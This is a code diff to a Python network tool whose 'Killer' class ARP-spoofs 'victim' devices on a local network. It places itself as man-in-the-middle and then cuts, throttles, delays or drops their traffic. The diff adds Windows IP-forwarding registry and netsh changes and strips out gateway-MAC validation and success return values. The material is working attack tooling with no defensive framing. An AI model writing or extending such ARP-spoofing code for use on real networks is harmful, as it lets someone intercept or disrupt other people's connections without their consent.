@@ -14,23 +14,56 @@ from tools.utils import (
     get_my_ip,
     good_mac,
     get_vendor,
-    is_usable_ether_mac,
 )
 from constants import *
 
 
 def enable_ip_forwarding():
-    """Enable kernel-level IP forwarding for fast packet forwarding."""
+    """Enable kernel IP forwarding (Clumsy ICS scripts set IPEnableRouter on Windows)."""
     try:
         if sys.platform == 'darwin':
-            # macOS
-            subprocess.run(['sysctl', '-w', 'net.inet.ip.forwarding=1'], 
-                         capture_output=True, check=False)
+            subprocess.run(
+                ['sysctl', '-w', 'net.inet.ip.forwarding=1'],
+                capture_output=True,
+                check=False,
+            )
         elif sys.platform.startswith('linux'):
-            # Linux
-            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'],
-                         capture_output=True, check=False)
-        # Windows: IP forwarding requires registry changes, skip for now
+            subprocess.run(
+                ['sysctl', '-w', 'net.ipv4.ip_forward=1'],
+                capture_output=True,
+                check=False,
+            )
+        elif sys.platform.startswith('win'):
+            try:
+                import winreg
+
+                key = winreg.OpenKey(
+                    winreg.HKEY_LOCAL_MACHINE,
+                    r'SYSTEM\CurrentControlSet\Services\Tcpip\Parameters',
+                    0,
+                    winreg.KEY_SET_VALUE,
+                )
+                winreg.SetValueEx(key, 'IPEnableRouter', 0, winreg.REG_DWORD, 1)
+                winreg.CloseKey(key)
+            except Exception:
+                subprocess.run(
+                    [
+                        'powershell',
+                        '-NoProfile',
+                        '-Command',
+                        "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
+                        "-Name 'IPEnableRouter' -Value 1 -Type DWord -Force",
+                    ],
+                    capture_output=True,
+                    timeout=12,
+                    check=False,
+                )
+            subprocess.run(
+                ['netsh', 'interface', 'ipv4', 'set', 'global', 'forwarding=enabled'],
+                capture_output=True,
+                timeout=12,
+                check=False,
+            )
     except Exception:
         pass
 
@@ -114,24 +147,8 @@ class Killer:
             conf.iface = guid
         except Exception:
             pass
-        return self.refresh_router_mac(ping_gateway=False)
-
-    def refresh_router_mac(self, *, ping_gateway: bool = True) -> bool:
-        """Resolve gateway MAC on the active iface (required for ARP MITM kill/lag)."""
-        guid = self.iface.guid if getattr(self.iface, 'guid', None) else self.iface.name
-        if not guid or guid == 'NULL':
-            return False
         router_ip = get_gateway_ip(guid)
         iface_ip = get_my_ip(guid)
-        if ping_gateway and router_ip not in ('', '0.0.0.0'):
-            try:
-                subprocess.run(
-                    ['ping', '-n', '1', '-w', '1000', router_ip],
-                    capture_output=True,
-                    timeout=4,
-                )
-            except Exception:
-                pass
         router_mac = get_gateway_mac(iface_ip, router_ip)
         self.router = {
             'ip': router_ip,
@@ -141,11 +158,11 @@ class Killer:
             'name': '',
             'admin': True,
         }
+        # Keep iface fields in sync for packet crafting / forwarder metadata.
         self.iface.ip = iface_ip
         self.iface.mac = good_mac(getattr(self.iface, 'mac', GLOBAL_MAC))
-        return is_usable_ether_mac(router_mac)
-
-    def kill(self, victim, wait_after=2) -> bool:
+    
+    def kill(self, victim, wait_after=2):
         """
         Spoofing victim.
         Default 2 second delay - ARP cache lasts 30-120s, no need to spam.
@@ -155,8 +172,6 @@ class Killer:
         stays in sync; only the ARP loop runs in a background thread.
         """
         self._sync_iface_for_victim(victim)
-        if not self.refresh_router_mac(ping_gateway=True):
-            return False
         mac = victim['mac']
         # Reassert path: even if already marked killed, refresh victim record and restart
         # ARP worker generation so ON state recovers from stale/desynced workers.
@@ -164,25 +179,24 @@ class Killer:
         self.killed[mac] = victim
         self._stop_forwarder(mac)
         self._kill_arp_worker(victim, wait_after, seq)
-        return True
 
-    def apply_percent_cut(self, victim, pass_percent=100, debug=False) -> bool:
+    def apply_percent_cut(self, victim, pass_percent=100, debug=False):
         """
         Keep MITM active and forward only a percentage of packets (both directions).
         """
-        if not self.kill(victim):
-            return False
+        if victim['mac'] not in self.killed:
+            self.kill(victim)
         pass_percent = max(0, min(100, int(pass_percent)))
         pass_from_victim = pass_percent
         pass_to_victim = pass_percent
 
         if victim['mac'] in self.forwarders:
             self.forwarders[victim['mac']].stop()
-        if not is_usable_ether_mac(self.router.get('mac') or ''):
-            return False
+        if not self.router.get('mac'):
+            return
         iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
         if not iface_to_use or iface_to_use == 'NULL':
-            return False
+            return
         fw = MitmForwarder(debug=debug)
         fw.start(
             victim=victim,
@@ -195,7 +209,6 @@ class Killer:
             pass_to_victim_pct=pass_to_victim,
         )
         self.forwarders[victim['mac']] = fw
-        return True
 
     def disable_percent_cut(self, mac):
         self._stop_forwarder(mac)
@@ -213,12 +226,12 @@ class Killer:
         max_kbps_out=0.0,
         max_kbps_in=0.0,
         debug=False,
-    ) -> bool:
+    ):
         """
         Forwarder with per-direction delay, optional jitter, loss %, and token-bucket caps.
         """
-        if not self.kill(victim):
-            return False
+        if victim['mac'] not in self.killed:
+            self.kill(victim)
         delay_ms_out = max(0, min(_MAX_DELAY_MS, int(delay_ms_out)))
         delay_ms_in = max(0, min(_MAX_DELAY_MS, int(delay_ms_in)))
         jitter_ms_out = max(0, min(_MAX_DELAY_MS, int(jitter_ms_out)))
@@ -229,11 +242,11 @@ class Killer:
         max_kbps_in = max(0.0, min(_MAX_SHAPING_KBPS, float(max_kbps_in)))
         if victim['mac'] in self.forwarders:
             self.forwarders[victim['mac']].stop()
-        if not is_usable_ether_mac(self.router.get('mac') or ''):
-            return False
+        if not self.router.get('mac'):
+            return
         iface_to_use = self.iface.guid if hasattr(self.iface, 'guid') and self.iface.guid else self.iface.name
         if not iface_to_use or iface_to_use == 'NULL':
-            return False
+            return
         fw = MitmForwarder(debug=debug)
         fw.start(
             victim=victim,
@@ -254,7 +267,6 @@ class Killer:
             max_kbps_to_victim=max_kbps_in,
         )
         self.forwarders[victim['mac']] = fw
-        return True
 
     @threaded
     def _kill_arp_worker(self, victim, wait_after=2, seq=0):
